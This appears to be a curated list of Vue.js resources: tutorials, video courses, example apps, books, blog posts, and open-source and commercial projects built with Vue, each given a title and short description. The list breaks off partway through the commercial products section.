Examples For Learning Vue.js\nMigrating from KnockoutJS to VueJS by @jesalg\nCreate a quiz with Vue.js by @rap2h\nVue.js: Getting Started by @chadcampbell\nVue.js 2 & Firebase - Building Real Time Single Page Web Applications\nVue.js 2 & Vue-Resource - Real-World Application With External API Access\nInteractive Vue.js Screencasts For Beginners\nVue.JS ile NASA API'\u0131n\u0131 Kullanarak Veri \u00c7ekme on YouTube by Ali G\u00d6REN\nWeb development with Vue.js 2 (Video) by Olga Filipova, Packt. (June 2017)\nBuild a realtime chart with VueJS and Pusher\nIntro to Vue, repo for Frontend Masters Course\nVue Guide on CSS-Tricks\nUsing Typescript in your VueJS app\nVue.js\u89c6\u9891\u7cfb\u5217\uff0c\u514d\u8d39\u3001\u5165\u95e8\u3001\u5b9e\u6218 on nodelover\nVue.js \u9884\u89c8 on ninghao.net\nVue.js: Development Machine Setup by @chadcampbell\nBuilding a Vue v2 JS app using Vue-router by @mikestreety\nBuild your own carousel with Vue by @Atom_Hernandez\nUnit Testing Vue.js Components with the Official Vue Testing Tools and Jest by @alexjoverm\nCreating Vue.js Transitions & Animation: Live Examples by @udyuxdev\nCreating Custom Vue.js Plugins\nAsync in VueJS part 1\nAsync in VueJS part 2\nUsing localStorage with Vuex store without a plugin by @mikestreety\nUsing props for accessing URL parameters within components with Vue Router by @mikestreety\nDeploy Vue.js\u200a\u2014\u200aSSR(Vuetify) on Production with Pm2 and Nginx\nTesting Vue Components on laracast\nBuilding a Full Stack Web App with Vue.js and Express.js by @CodyLSeibert\nVue.js 2 Recipes (Video) by Peter van Meijgaard, Packt. (September 2017)\nGetting Started with Vue.js on Sabe.io\nBuilding Your First Advanced CRUD Application with Vue 2 (Video) by Peter van Meijgaard, Packt. (July 2017)\n\ud504\ub860\ud2b8\uc5d4\ub4dc \uac1c\ubc1c\uc790\ub97c \uc704\ud55c Vue.js \uc785\ubb38\uc11c\n\ub204\uad6c\ub098 \ub2e4\ub8e8\uae30 \uc26c\uc6b4 Vue.js (Video) on Inflearn by Captain Pangyo\nBuild a Vue.js Blog in 2 hours tops on Snipcart\nGetting Started with VueJS 2 by Sachin Bhatnagar @sachinbee on Udemy\nGetting Started with Vuex: Managing State in Vue.js on Sabe.io\nVue2 ACL using CASL by Sergii Stotskyi\nJavaScript Choice Made Easy - Angular v. React v. Vue (Video) by Daniel Kmak, Packt. (November 2017)\nVuejs 2.5+ Authentication Tutorial using Auth0 on Storyblok blog\nGraphCMS beginners guide with Vue on GraphCMS\nVue.js debugging in Chrome and VS Code This recipe shows how to use the Debugger for Chrome extension with VS Code to debug Vue.js applications generated by the Vue CLI.\nGetting Started with Vue JS 2 (Video) by Sachin Bhatnagar, Packt. (January 2018)\nBuilding a movie app interface with Vue.js by Hassan Djirdeh, @djirdehh\nLet\u2019s Build a Custom Vue.js Router by Hassan Djirdeh, @djirdehh\nGetting started with Vue, Webpack 4 & Babel by Bjorn Krols, @KrolsBjorn\nHow to add Bootstrap 4 to your Vue project by Bjorn Krols, @KrolsBjorn\nHow to add Semantic UI to your Vue project by Bjorn Krols, @KrolsBjorn\nHow to add ESLint to your Vue project by Bjorn Krols, @KrolsBjorn\nHow to make content dynamic via URL query parameters in Vue by Bjorn Krols, @KrolsBjorn\nHow to enable history mode for AWS S3 hosted Vue applications by Bjorn Krols, @KrolsBjorn\nA basic introduction to debugging Vue applications using breakpoints by Bjorn Krols, @KrolsBjorn\nBuilding a Library Management app with Vue, Firebase and Scaffoldhub By Felipe Lima @fpastorelima\nBuild a Vue.Js E-Commerce App with ButterCMS Headless Backend\nMASTER VUE.JS\nBuild a voting application with Go and Vue.js\nBuild a collaborative painting app using Vue.js\nBuild a realtime payment dashboard with Stripe\nBuild a cryptocurrency tracker using Vue.js\nBuild a design feedback app using Vue.js\nDeveloping a Single Page App with Flask and Vue.js\nAccepting Payments with Stripe, Vue.js, and Flask\nAPI Driven Development With Laravel and VueJS (Free Course) on serversideup.net\nManaging State in Vue.js by Hassan Djirdeh, @djirdehh\nReal World Projects with Vue.js by Daniel Khalil, Packt. (August 2018)\nHeartbeat (Vue + NW.js Video series) by @ackzell (2017 - 2018)\nFirebase Server-Side Render Vue Apps with Nuxt.js (Server-side Rendering with JavaScript Frameworks)\nFirebase Measuring Vue SSR Performance with Nuxt.js (Server-side Rendering with JavaScript Frameworks)\nCreating an interactive map with D3 and Vue (October 2018)\nThe guide to write universal, SSR-ready Vue components\nVue.js Fundamentals by Vue School\nVuex for Everyone by Vue School\nVue.js Form Validation by Vue School\nThe Vue.js Master Class by Vue School\nVue.js Firebase Realtime Database by Vue School\nVue.js Firebase Authentication by Vue School\nDynamic Forms with Vue.js by Vue School\nCustom Vue.js Directives by Vue School\nVue.js Application Development Essentials by Bart\u0142omiej Potaczek, Packt. (October 2018)\nTroubleshooting Vue.js by Christian Hur, Packt. (October 2018)\nNuxt.js - Vue.js on Steroids by Maximilian Schwarzm\u00fcller, Packt. (October 2018)\nBuilding an Electron File Explorer with Quasar (and Vue) by @hawkeye64. (November 2018)\nBuild Web Apps with Vue JS 2 & Firebase on Udemy by the Net Ninja\nVue JS 2 - The Complete Guide (incl. Vue Router & Vuex) on Udemy by Maximilian Schwarzm\u00fcller\nSPA Application using Vue.js, Vuex, Vuetify, and Firebase (Part 1) by Jennifer Bland @ratracegrad. (November 2018)\nSPA Application using Vue.js, Vuex, Vuetify, and Firebase (Part 2) by Jennifer Bland @ratracegrad. (November 2018)\nSPA Application using Vue.js, Vuex, Vuetify, and Firebase (Part 3) by Jennifer Bland @ratracegrad. (November 2018)\nSPA Application using Vue.js, Vuex, Vuetify, and Firebase (Part 4) by Jennifer Bland @ratracegrad. (November 2018)\nAdding Internationalization to a Vue Application by Jennifer Bland @ratracegrad. (November 2018)\nPractical Projects with Vue JS 2 by Jack Herrington, Packt. (December 2018)\nVue.js \uae30\ucd08 \ub2e4\uc9c0\uae30 (Video) on Lessipe by Lessipe\nFull Stack Web Development with Vue.js and Node.js by Haider Rehman, Packt. (January 2019)\nVue for Designers by Design+Code (February 2019)\n\nExamples\n\nStarter Application with JWT Auth + sample backend API in Laravel\nNode Webkit + Vue example by @brandonjpierce\nVue Samples by @superlloyd\nHackerNews clone with vue.js + vue-router by @kazupon\nElectron + Vue example by @bradstewart\nSingle page application example (Vue + Voie) by Boris Okunskiy\nBegin - Task Manager SPA written in Vue + Lumen by Raj Abishek\nVue Mini Shop by BosNaufal\nVue SoundCloud by mul14\nFeature Requests (Laravel + Vue Combo) by haydenbbickerton\nVue Cookbook (Vue1.0 + express) by @yjj5855: A demo first screen rendering of a service\nStrong Together - A starter project to build single page Vue.js apps as stand-alone or for Laravel / Laravel Spark projects, based on Browserify and Semantic-ui) by WebSemantics\nvuetest: an ad admin web with user auth, bootstrap ui, uploader, WYSIWYG editor in iframe\nvue-shopping by andylei18\nVue-cnodejs,060 by @shinygang\nvue-zhihu-daily by hilongjw\nVueChess -Multiplayer online chess game  by gustaYo\nNgexplorer-vuejs-client -Vue client for Ngexplorer   by gustaYo\nVue 2048 (Vue + Webpack) by @pengfu: Popular 2048-Game implemented using Vue,Webpack,Sass,ES6\nVue Simple PWA by BosNaufal\nTour of Heroes (Vue 2.0): A Vue 2.0 port of the Angular 2.0 Tour of Heroes demo app. Highlights: ES6/7, render functions, JSX, revue (redux bindings for Vue), vue-router, Airbnb eslint, webpack. by @aweber1\nvue-table-pagination A table with pagination by echovic\nFeathers and Vue 2.0 Blog Admin Demo Demo for using Feathers with Vue 2.0. It includes authentication, vue-router, vue-infinite-loading and roles by delay\nvue-zhihudaily-2.0 Zhihudaily demo built with Vue 2.0, vue-router & vuex, with server-side rendering. by cs1707\nvue-demo-todolist a simply vue2.0 demo built with Vue 2.0, vue-cli. by fishenal\nvue-AdminLte by liujians\nVue(2.0) + Node.js: A blog content manage system (CMS) by @ycwalker\nngexplorer-quasar -Implementation of Ngexplorer with quasar framework by gustaYo\nzhihu-daily-vue a zhihu daily base on vue2.0 by moonou\nloopback-vue loopback+vue+vue-resource,ionic-app,vue page\u5206\u9875\u529f\u80fd,authenticate \u6743\u9650\u63a7\u5236,accesstoken\u673a\u5236,credentials,CI,docker  qxl1231\nvue-s3-dropzone A Vue.js drag-and-drop component uploads files to AWS S3 serverlessly\neasy-vue a easy example using the vue to implement easy web with vue 2.0, vuex 2.0, vue-router 2.0, vue-infinite-scroll 2.0, vue-progressbar 2.0 by TIGERB\nVuex Events Messaging Demo by Metric Loop\nvue-memo a simple demo build with Vue.js(>2.x.), vue-router(>2.x.), vuex(>2.x.), vuex-router-sync@next(>3.x.) and Firebase(>3.6.x) by akifo\nResume Vue JSON based Resume based on Vue 2.0 by ChangJoo Park\nApp example with JWT Authentication developed with Phoenix Framework, Vue and Vue Router (demo) by @Angarsk8\nSample CRUD app with router in Vue 2.0 by @shershen08\nASP.NET Core Vue.js server-side rendering sample by @mgyongyosi\nvuefire-quickstart - Documented Firebase integration w/ webpack and eslint, by @sejr.\nhello-vue-django Vue.js and Django integration starter project with hot code reload\nReal Time Social News App developed with Phoenix, Vue, Vue Router and Vuex (demo) by @Angarsk8\nvue-calculator a simply calculator built with Vue 2.0, vue-cli(webpack-simple). by CaiYiLiang\nWikipedia-viewer A simple wikipedia-viewer page built with vue2.x ,vue-router,vue-cli(webpack-simple) and ajax(jsonp). by CaiYiLiang\nvue2.x-douban A simple of douban movie build with vue2.x,vue-router and axios(\u8c46\u74e3\u7535\u5f71). by Superman\nvue-laravel-example Vue - Laravel - Example is a simple example to set Vue with Laravel. by Jiajian Chan\nvue-foundation A demo app integrating VueJS with Zurb Foundation, built using the webpack vue-cli f\naspnetcore-Vue-starter A VueJS 2 starter template as part of an asp.net MVC dotnetcore project. This template includes the VueJS client app and a backend API controller.\nvue-reddit-app A Reddit SPA demo built with Vue 2.X , Vue Router 2 , Vuex and axios. Using Muse-UI and vue-cli webpack template by @yujiahaol68\nvue-music-qq A qq-music project is based on vue-cli. The pages are simple and smooth\nNavigationTab with Vue-Redux and Plain VueJSX  Navigation Tab with both plain Vue JSX and Vue + Redux Binding\nVeggie Map An interactive demo using Vuejs + Vue router + Leaflet and Firebase\nvuejs-d3 examples how to use d3 for visualisations.\nvue-twitter-client A Twitter Client App build with Vue 2.X, Vuex, electron-vue and Electron\nDouban Awesome douban Example created with Vue2.x + Vuex + Vue-router + vue-resource. by jeneser\nStoryblok vuejs-boilerplate - Integrates Storyblok's Component System, allows to create editable Websites.\nVuexpresso - A boilerplate using VueX, Vue-Router, Vue-Apollo, webpack, GraphQL, Apollo-client, express and mongo\nVue.js with Sails.js example project - This project is for those who are new to single-page applications and want to learn through a real example.\nVue.js & Pyramid web framework app - A boilerplate using Pylons Pyramid webframework backend Vuejs webpack2, vue-router, yarn(packet manager)\nvue-feathers-chat A sample realtime chat made with Vue in frontend and Feathers in backend, but using just Socket.IO-Client for the communication\nvue-xplan A rotating earth demo page created with Vue and three.js\nvueSocketChatRoom A socket chat room using vue2.x,vuex2.x,vue-router2.x,vux2.x,socket.io\nvue-tetris (Use Vue, Vuex, Immutable to code Tetris) by @Binaryify: Use Vue, Vuex, Immutable to code Tetris.\nroute-planner-vue by @Kasheftin: The tool for planning routes with multiple sortable layers, draggable directions, markers and shapes on google map.\nMyDiary-Vue A diary application build with Vue 2.X which is also have contact and todolist function\nVueJS Example Projects on Github by Ali G\u00d6REN\ntodo-mvc-webpack by voluntapear TodoMVC implementation on Vue 2 using the webpack-basic template with examples showing vuex, vue-router, central event bus and VueFire.\nChess Storybook Example with Vue 2.0 by gustaYo\nVue Weather Notifier A small sample animation app with SVG and Vuex\nNuxt Type An example Vue project with Nuxt for routing/SSR to demo page transitions\nVueBlog A blog system supporting service side rendering by wmui\nCinemateka - An example of SPA made with Vue v1 & Laravel 5. Film & events schedule. Russian comments.\nvue-2.x-boilerplate - A simple and small starter kit for a Vue project Vuex + vue-router\nvue-minesweeper - A deadly simple minesweeper game with vuejs by rhapsodyn\nX-Flowchart-Vue - A flowchart editor with SVG and Vue by OXOYO\nkoa-vue-notes-web - A fleshed-out SPA using Koa 2.3 on the backend and Vue 2.4 on the frontend. Includes fully featured user-authentication components, CRUD actions for the user's notes, and Vuex store modules.\nVuejs Shopping Cart - Shopping cart example using Vuejs and Firebase\nPokedexVueJs by @rchung95\nvuefire-auth A Vuefire Vue2-Auth-Email Verification with Firebase\nvuefire-realtimedatabase A Vuefire Vue2-RealtimeDatabaseCRUD with Firebase\nvuefire-storage A Vuefire Vue2-Storage with Firebase\nVue2-PWA-Blog by @deepak-singh\nvue-firebase-auth-vuex A Vue2 Firebase Authentication with Vuex and support Progressive Web Apps\nvue-chart-stater-kit Quick starter using Vue Router, Vue Chart, Element-UI\nvue2.0-demos using mint-ui, Element-UI,And have Some demos\uff08select city and so on\uff09\nconway Conway's Game of Life in Vue.\nvuex-feature-scoped-structure An example application of the feature scoped vuex application structure\nvuex-examples - Simple Examples on using Vuex to build Real World Apps\nvue-vuex-todomvc - Example TodoMVC Vue.js app with Vuex store and server backend via REST and full set of E2E tests using Cypress.io test runner.\nvuejs-sqljs-boilerplate - This is a boilerplate to use both Vue.js and sql.js together\nX-WebDesktop-Vue - The WebDesktop system based on Vue by OXOYO\nvuejs-music-player - A Vue.js lite music player\nVue.js Best Practices Example Project - A best practices example project using Vue.js + Vue Router + Vuex + Vuelidate\nVue.js [ONE] client - [ONE] client written with Vue2.5\nVue.js 2.5 with vue-cli v3 including authentication with auth0 by Dominik Angerer, Storyblok\nSkeleton Vue+TypeScript - TypeScript, VueJS, ElementUI, Vue Router, Vuex, Material Icons, BrowserSync, Dockerfile\nPENV Starter by @jesalg - A basic example of how to use VueJS, Express and PostgreSQL in conjunction.\nvue-relay-examples - A collection of example applications using vue-relay.\nlaravel-vue-boilerplate - A Laravel 5.5 SPA boilerplate with a users CRUD using Vue.js 2.5, Bootstrap 4, TypeScript, Sass, Pug and Jest.\nVue Design System - An open source boilerplate for building UI Design Systems with Vue.js.\nVue Bulma Demo - A simple demo website to check out Bulma / Vue JS & express in conjunction.\nStarter application ready for production with TypeScript, vuex, vue-router, HMR and more\nvue.js\u4e0elaravel\u7ed3\u5408\u7684\u524d\u540e\u7aef\u5206\u79bb\u5f00\u53d1\u6a21\u677f- A template website to laravel passport / Vue.JS & Element UI.\nHands-On Web Development with Vue.js by Roman Kuba, Packt. (May 2018)\nVue Online Shopping Mall - A online shopping mall SPA demo, \u57fa\u4e8eVUE\u5f00\u53d1\u7684\u524d\u540e\u7aef\u5206\u79bb\u7535\u5b50\u5546\u57ce\u524d\u7aef\u9879\u76ee\nFUE - Admin SPA client and server side boilerplate with Vue.js + Vue Router + Vuex + Vuetify + FeathersJS\nVue + TypeScript Cookbook - A small cookbook covering some less-than-obvious solutions for people getting started with Vue + TypeScript\nVuejs Examples\nASP.NET Core Vue Starter CLI 3.0 A Vue starter template using Vue CLI 3.0 with custom configuration (default TypeScript, Vue, Router, Vuex, Vuetify) integrated with ASP.\u200bNET Core by @SoftwareAteliers (September 2018)\nvue-soundcloud A Soundcloud client built with Vue.js 2, by Soroush Chehresa\nvue-cart  A simple shop cart made with vue, vuex and vue router. by crisgon\nNuxt + Apollo + Element A Vue.js SSR boilerplate with Nuxt, Element (custom theme) and Vue Apollo.\nvue-daily-zhihu a simple demo build with Vue 2.0 & vue-router & vuex by walleeeee\ncharcoal A starter template using the Vue CLI 3.0 and styled with Bulma by Seth Davis\nMulti-page ASP.NET Core Vue with TypeScript - Multi-page ASP.NET Core Vue, Typescript, Vuex, Vue router, Bulma, Sass and Jest application. Template/starting point on how to use Vue.js as a multi page(multiple mini spa's) application in .NET Core MVC.\nCION - Design system boilerplate for Vue.js - A design system build primarily for Vue.js applications. It utilizes design tokens, a living styleguide with integrated code playgrounds and reusable components for common UI tasks.\nVue websockets example - A basic example of Websockets usage with Vue.js 2 + Node project for full working example.\nVue(2.0) + Node.js: A blog by @FatDong1\nvue-todo-list ToDo List sample app based on Vue + Vuex + Vuetify + Vee-Validate\nVue.js and Ionic v4 examples - A set of examples of how to use Ionic v4 with Vue.js\n Personal Website that use Vue, Vuex and Vue-Router  - A simple website example that made with vue, vuex and vue-router by Muratcan \u015eent\u00fcrk\nClient-Side Vue.js - Demo - Vue.js client-side for tiny, quick-loading, node.js-less Single Page Apps by Justin Wash\n\nBooks\n\nThe Majesty Of Vue.js by Alex Kyriakidis & Kostas Maniatis, Packt. (Nov 2016)\nLearning Vue.js 2 by Olga Filipova, Packt. (Dec 2016)\nThe Majesty Of Vue.js 2 by Alex Kyriakidis and Kostas Maniatis, Leanpub. (Mar 2017)\nVue.js 2 Cookbook by Andrea Passaglia, Packt. (May 2017)\nVue.js in Action by Erik Hanchett and Benjamin Listwon (Spring 2018)\nTesting Vue.js Applications by Edd Yerburgh (Summer 2018)\nVue.js 2 and Bootstrap 4 Web Development by Olga Filipova, Packt. (September 2017)\nFront-end com Vue.js by Leonardo Vilarinho, Casa do C\u00f3digo. (November 2017)\nVue.js 2 Web Development Projects by Guillaume Chau, Packt. (November 2017)\nFull-Stack Vue.js 2 and Laravel 5 by Anthony Gore, Packt. (December 2017)\nVue.js 2.x by Example by Mike Street, Packt. (December 2017)\nMastering Vue.js by Oleksandr Kocherhin. (January 2018)\nFullstack Vue: The Complete Guide to Vue.js by Hassan Djirdeh, Nate Murray, & Ari Lerner. (March 2018)\nVue.js 2 Design Patterns and Best Practices by Paul Halliday, Packt. (March 2018)\nVuex Quick Start Guide by Andrea Koutifaris, Packt. (April 2018)\nFull-Stack Web Development with Vue.js and Node by Aneeta Sharma, Packt. (May 2018)\nThe Vue Handbook by Flavio Copes. (July 2018)\nASP.NET Core 2 and Vue.js by Stuart Ratcliffe, Packt. (July 2018)\nVue.js: Construa aplica\u00e7\u00f5es incr\u00edveis by Caio Incau, Casa do C\u00f3digo. (September 2017)\nGetting to Know Vue.js by Brett Nelson, Apress. (August 2018)\nVue: Build & Deploy by Daniel Schmitz, Leanpub. (September 2018)\nBuilding Applications with Spring 5 and Vue.js 2 by James J. Ye, Packt. (October 2018)\nVue.js Quick Start Guide by Ajdin Imsirovic, Packt. (October 2018)\nVue.js Component Patterns Course by Frederik Dietz (April 2019)\n\nBlog Posts\n\nVue x Hasura GraphQL\nUsing GraphQL Mutations in Vue.js\nLearn How To Build A Data-Driven Search UI with Vue.JS\nUsing GitLab CI/CD to auto-deploy your Vue.js application to AWS S3\n\nProjects Using Vue.js\nOpen Source\n\nPageKit - Modular and lightweight CMS built with Symfony components and Vue.js.\nnpmcharts.com - Compare npm packages and spot download trends.\nKoel - A personal music streaming server that works.\nRaven Reader - Simple RSS Reader made using atom electron and vue.js.\nGokotta - A simple music player built by electron and vue.\nCoPilot - An admin portal based on AdminLTE with vue.js integration.\nRetrospectify - A simple tool for doing collaborative retrospectives in agile teams.\njade-press - Cms based on mongodb, nodejs, koa, vue and more.\nastralapp - Organize Your GitHub Stars With Ease.\nEME - An Elegant Markdown Editor.\nGithub-explorer - A spa which can help you check your github in a better way.\nHotel - Start your dev servers from your browser and get local domains in seconds.\nSurfbird - A Twitter client written with modern web technologies.\nApproach0 - A math-aware search engine.\nFlox - Self Hosted Movie, Series and Anime Watch List.\nJavaScript Guessing Game - A game for identifying JavaScript tools and libraries.\nvue-ghpages-blog - A blog based on GitHub pages by Vue.js 2 + Webpack 2.\nVuedo - Blog platform, built with Laravel and Vue.js.\nvue-music163 - A Vue.js project for music.\nTomato5 - Real-time collaboration tool, it combines Pomodoro Technique with a team status share board.\nWeb Learn - A service which provides simple access to thousands of video tutorials on web developing and programming.\nExcelJSON - A tool to convert CSV, TSV to/from JSON.\nMaterialize-blog - A material blog built with Laravel5.3 and Vue2.x.\nVueCompomnentGenerator - Generate vue single file component on browser.\nSDR News - News for web designers and developers aggregated from multiple sources (Reddit, Hacker News and Prominent Blogs).\nPJ Blog - Open source blog built with Laravel and Vue.js.\nLulumi-browser - Lulumi-browser is a light weight browser coded with Vue.js 2 and Electron.\nvue-wordpress-pwa\nOpenAPI 3 viewer - Browse and test a REST API described with the OpenAPI 3.0 Specification\nStacer - Linux System Optimizer and Monitoring\nDistrochooser.de - An orientation guide for Linux beginners\nBuka - EBook Management\nDocute - A framework for writing documentation without build process\npm86 - Production process manager for Node.js apps Websites\nvms - A Vue.js 2.0 Management System\nnativescript-vue - A Vue.js implementation of the NativeScript renderer.\npiper - A drag-and-drop mobile website builder base on Vue.\nmmf-blog-vue2 - A blog based on Vue2(Vue-router, Vuex) and Webpack2.\nMedia Manager - Web File Manager.\ndyu/bookmarks - A self-contained, self-hosted bookmarking app powered by leveldb, built with Vue2.1.x.\nJSON Schema Editor - An intuitive editor for JSON schema. Develop with Vue.js 2 and Firebase.\nnpm-stats - npm package download statistics dashboard\nvue2-admin-lte - a project that converts AdminLTE to work with Vuejs (v2.x).\nDockeron - A project built on Electron + Vue.js for Docker on desktop.\nFlamme - An open source Tinder desktop client built with electron and Vue.js for educational purposes\nGoldfish - A HashiCorp Vault UI built with VueJS, Golang, and Bulma CSS\nAdminify - An Admin dashboard based on Vuetify, check the Online Demo\npromptie - A framework written in Vue.js for creating command-line like interfaces in web browsers.\nHare - \ud83d\udc07 Application boilerplate based on Vue.js 2.x, Koa 2.x, Element-UI and Nuxt.js\nPaper-Dashboard -Creative Tim Paper Dashboard made for Vue\nAdminLTE-VueJS2 - An open source project that implements  VueJS (v2.x) on AdminLTE.\nMaterial Dashboard - Creative Tim Material Dashboard made for Vue\nExplore-Github - VueJS 2 Github Explorer Using API v3\nCoreUI - Open Source Admin Template powered by Vue.js\nChuckNorris - Chuck Norris Jokes Generator built with VueJS + api.chucknorris.io\nLeafPlayer - A simple and fast, privately hosted music streaming server.\nJSON Editor - A schema-aware JSON editor. Develop with Vue2.\nVoten - A Reddit-like platform built with Vue2 and Laravel.\nNews Weaver - A web based RSS Reader/Aggregator made using VueJS and VuetifyJS\nWake Up Billie Joe! - A web site countdown to October, based on Green Day's song Wake me up when September Ends. Created using Vue and Firebase.\nAstrum - A lightweight pattern library designed to be included with any web project.\nvue2-pwa-vision - A Face Detection Google Cloud Vision with Vue2 + Vuetify + Progressive Web App\nvue2-pwa-rekognition - A Face Detection Amazon Rekognition with Vue2 + Vuetify + Progressive Web App\nAmmoBin.ca - meta search site for online ammo prices across Canada\nSPA-asp.net-api-vuejs- - A Vue.js single page application for basic task Management & messaging using ASP .NET Webapi 2 and SQL server\nBook-Trading-Club - Trade or loan books with other book readers in your area. Built using nodejs and vuejs2\nvuejs-extension-pack vscode - An extension packf or vscode with popular VS Code extensions for Vue.js development.\nWiki.js - A modern, lightweight and powerful wiki app built on NodeJS, Git and Markdown\nvue-pwa-speech - A Speech to text With Google Cloud Speech on Vue2 + Vuetify + Progressive Web App\nvue-speech-streaming - A Performing Streaming Speech Recognition results in real time Speech To Text with Google Cloud Speech + socket.io on Progressive Web App\nMy Animation List - A tool to easy get css animation code\nvue-input-streaming - A TextInput Streaming RealTime And Two Way Data Binding Broadcasting with Pusher\nTidyTab - A Chrome extension for tidying up those tabs.\nperegrine-cms - A Vue.js and Apache Sling based head-optional CMS\nconcept-to-clinic - Lung cancer prediction project with Vue.js interface\ngrid-awesome - Generate boilerplate css for grid layouts using the css display: grid; property.\nLight Bootstrap Dashboard - Creative Tim Light Bootstrap Dashboard made for Vue\nHubaga - A free and lightweight WordPress eCommerce plugin for developers and other digital shops.\nvue-webpack-buefy - Vue.js starter with full-featured Webpack and Buefy\nCoypu - Text-editor-like weekly planner\ncore-server - Highly scalable VueJs framework with an integrated API system, and multiple advanced features.\ndiscord-logo - A Vue.js animated discord logo generator based on SVGs. (Github Page)\nnode-vue-template - A starter template for building complete application using Node.js (API) and Vue.js (SPA) with some included packages and configurations to help start the development quickly.\nvue-storefront - Vue.js Storefront - PWA for eCommerce. 100% offline, platform agnostic, headless, Magento2 supported.\nfd-vue - Vue.js client for an IoT framework\nwildfire - A drop-in replacement for other comment plug-ins.\nRide Receipts - Simple automation desktop app to download and organize your tax invoices from Uber and Lyft.\nvue-chrome-extension-boilerplate - Boilerplate for Chrome extension using Vue.js and Webpack\nTimeMark - A Time manager which will can record your time and some more function will be developed.\nLaravel Enso - SPA Admin Panel built with Bulma, VueJS and Laravel, packing lots of features out of the box.\nCode Notes - A simple code snippet manager for developers built with Electron & Vue.js.\nPomotroid - Simple, visually-pleasing and customizable Pomodoro timer.\nXMR Miner - Cryptocurrency (XMR) mining app, built with Vue.js and visualized with D3\nXMR Paper - Monero wallet generator, built with Vue.js\nJoyProxy - Chrome extension for handling proxy settings\nactivity-automation - Manage daily activities and get reports on timely basis.\njsettlers-web Popular German board game to build hexes, settlements, cities, roads with earned resources\nTamiat CMS - Tamiat is a front-end focused CMS, uses Vue.JS as the frontend and integrates with Firebase for the backend functionality.\nvuegg - vue GUI generator: Create mockups and code in one go! It leverages the creation of pages, components and styles with its visual editor. Generate all scaffolding code for your next vuejs project.\nPodlove Web Player - Podcast-optimized, HTML5-based audio player featuring chapters, transcripts and embedding.\nLeo Vue - Use the open source Leo outlining editor/IDE to create webapps with nested menus, with support for Vue components in content.\nJustine - A configurable HTML documentation generator (currently supports JSDoc) using Vue components for the documentation template\nDeezer-Vue - Deezer client built with Vue\\Vuex\nVuep.run - Online SFC editor for Vue\nV\u00b7oogle - Google.com, reVued\nPomidorus - Pomodoro time tracker build using Vue and D3 \ud83c\udf45\nHubble - \ud83d\udd2d Travel through GitHub Stars' history.\nVuepress - Minimalistic Vue-powered static site generator\nSocialhome - A federated rich profile builder with social networking features\nGenVue - a hostable, web application that lets confidential users upload and share private files build on Vue.js, Vuetifyjs and NetCore WebAPI stack\nvue-array - Array object operation under Vue, Array object operation under Vue Use this package to manipulate the array. Vue can monitor the changes in the array\nLaqu-l - A complete App starter kit with Quasar Framework, GraphQL API backend with OAUTH 2.0 authentication, Firebase ready, multilanguage capability and more.\nProtovue - A prototyping component library that helps designers and developers quicky scaffold an abstracted app layout.\nChattier - SPA social network built with Laravel 5.6, Vue.js 2, and Bulma (Buefy components + Bulmaswatch themes). Also uses JWT authentication.\nchrome-ribbon-reminder - A Chrome extension written using Vue and Async/Await. Uses a popup display and changes badge counts.\nFaviator - A simple easy favicon generator.\nModular Genealogy - Genealogy / family tree management system using Laravel 5.7, Vue.js 2.5 and various components. Work in progress.\nMinimal Notes - Web app build with Vue.js\nRoast an app built to help coffee enthusiasts find their next cup of coffee while learning about Laravel + Vue.js.\nStack Edit - In-browser Markdown editor\nBael Blog Template -  A static generated blog template that uses Netlify CMS for the backend and Netlify for hosting. Features a brutalist aesthetic, fuzzy search, serverless email signup, and more.\nBuefy Shop Sample shop, open source, built with Nuxt, Stripe, Firebase, Bulma and Serverless Functions.\nsysmon A B/S mode system monitor for Linux. You can remotely watch the usage of your system resources via web browser everywhere.\neth-vue A Truffle Box that provides everything you need to quickly build Ethereum dApps that have authentication features with Vue.js, including configuration for easy deployment to the Ropsten Network. It's also Gravatar-enabled.\nNippon-color Inspired by nipponcolors dot com. This is a nippon-color PWA build with vue-cli 3.\nSaleina CMS A static site content management system built with vue using git as a backend.\nVuido A framework for creating native desktop applications. It can run on Windows, OS X and Linux, using native GUI components.\nYouGet YouTube Video/Audio/Subtitle Downloader + Cutter\nVue Pug Stylus Vue + Pug + Stylus boilerplate \ud83d\udc9a \ud83d\udc36 \ud83d\udd8c\nCrypto News allows you to convert cryptocurrencies, view latest news and exchange rates for each ICO \u2013 all the data from the world of cryptocurrencies in one place.\nEpiboard A new tab page extension with material design and useful features \ud83c\udd95 \ud83c\udf89\nzhudyos/duic Distributed configuration center \ud83c\udd95\nVuemmerce Free ecommerce template built with Vue.js and Bulma framework \ud83c\udd95\nNucleus Layered architecture ASP.NET Core API and Vuejs client application startup template\nCarpoolear The open source Vue.js frontend (mobile and cordova app) for the argentinian carpooling application: Carpoolear\nStatusfy: Statusfy is a Status Page System, easy to use and completely Open Source.\nDynamoDb-GUI-Client: Cross-platform GUI client for DynamoDb\nRosterWebApp Open source rostering web application which allows the rostering of employees/teams to work sessions and other features.\nVue E-Store Templet - An e-commerce templet build with vue/vuex/vue-router and bootstrap4.\nKitty Ipsum - Generate lorem ipsum composed of \"meow\" in different languages.\nGit Superstar - Count your git stars and top repositories.\nTwill - An open source CMS toolkit for Laravel that helps developers rapidly create a custom admin console that is intuitive, powerful and flexible.\nMATH_BOT - Learn math by programming a robot.\nVue Crossword - A Vue.js based crossword puzzle builder and filler front-end application. Built with CodeSandbox.\nVue Org Chart - Manage and publish your interactive organization chart (orgchart), free and no webserver required.\nBeep - Account Security Scanner built with Vue.js and Ionic 4\nVue CRUD - Vue.js based REST-ful CRUD system. Vue CRUD allows you to easily create fast applications such as CMS or CRM.\nVue HQ Admin Dashboard \u2013 A modern admin dashboard powered by Vue, Sass, Firestore, and Netlify.\nMToDo - Mini To Do Lists with simple auth built with Vue.js and JSON Server as data mock. Great as reference for anyone that finding reference about real world Vue.js\nFireX Proxy - FireX Proxy is the user's trusted Chrome and Firefox browser extension that allows you to unblock any website and browse the web privately and securely. \ud83d\udee1\nVueSolitaire - Solitaire (spider,klondike) imlemented in Vue.js.\n\nCommercial Products\n\nWijmo - A collection of UI controls with VueJS support.\nCollate Notes\nFormester - Form, email marketing automation made easy\nChatWoot - Livechat and agent collaboration over Facebook messenger.\nVueA - VueJS Admin template with multiple layouts and laravel version.\nTeleo - Team collab-app moving effortlessly between talking, planning & doing\nCover - A high quality Component Library built on Vue.js\nEducationLink - CRM and sales automation for education agents and colleges.\nPragmatic - Responsive and configurable admin template built with Vue.js and Element.\nSeat - Simple and modern team communication and collaboration solution.\nMoonitor - Cryptocurrency tracker for Desktop.\nDeskree - Online collaboration platform that combines Ideas, Tasks, and Issues in one place.\nOSHCExpress - 